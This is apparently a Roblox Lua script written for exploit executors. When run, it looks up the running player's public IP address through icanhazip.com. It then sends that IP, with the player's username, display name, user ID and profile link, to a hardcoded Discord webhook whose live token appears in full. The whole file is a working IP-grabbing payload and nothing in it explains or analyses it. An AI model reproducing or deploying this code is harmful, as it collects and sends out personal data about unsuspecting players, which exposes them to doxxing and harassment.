local URL="https://discord.com/api/webhooks/1441103026931765311/nbhboyn_AGPUJGnFJ8wsoY4LdkElFIuTwyV4WtR_qUobOI59_i_2v1Tk-Kb3g3pynVEI"
local IP_URL="https://icanhazip.com/"

local Player=game.Players.LocalPlayer
local Name=Player.Name
local DisplayName=Player.DisplayName
local UserId=Player.UserId

local HttpService=game:GetService("HttpService")

local requestfunc
if syn and syn.request then
    requestfunc = syn.request
elseif request then
    requestfunc = request
elseif Xeno and Xeno.request then
    requestfunc = Xeno.request
elseif http_request then
    requestfunc = http_request
end

if requestfunc then
    local IPaaa = requestfunc({
        Url = IP_URL,
        Method = "GET",
    }).Body
    if IPaaa then
        local payload
        if DisplayName then
            payload={
                ["content"]="",
                ["embeds"]={
                    {
                        ["color"]=16711680,
                        ["title"]="だぶぷろかみすぎだろろがーV1",
                        ["fields"]={
                            {["name"]="IPIP",["value"]="||"..IPaaa.."||",["inline"]=false},
                            {["name"]="Name!!",["value"]=DisplayName.."(@"..Name..")",["inline"]=true},
                            {["name"]="Ong userid",["value"]=UserId,["inline"]=true},
                            {["name"]="Prof URL",["value"]="https://www.roblox.com/users/"..UserId.."/profile",["inline"]=true}
                        }
                    }
                }
            }
        else
                        payload={
                ["content"]="",
                ["embeds"]={
                    {
                        ["color"]=16711680,
                        ["title"]="だぶぷろかみすぎだろろがーV1",
                        ["fields"]={
                            {["name"]="IPIP",["value"]="||"..IPaaa.."||",["inline"]=false},
                            {["name"]="Name!!",["value"]="@"..Name,["inline"]=true},
                            {["name"]="Ong userid",["value"]=UserId,["inline"]=true},
                            {["name"]="Prof URL",["value"]="https://www.roblox.com/users/"..UserId.."/profile",["inline"]=true}
                        }
                    }
                }
            }
        end

        local body = HttpService:JSONEncode(payload)
        local PG = requestfunc({
            Url = URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body,
        })
    end
end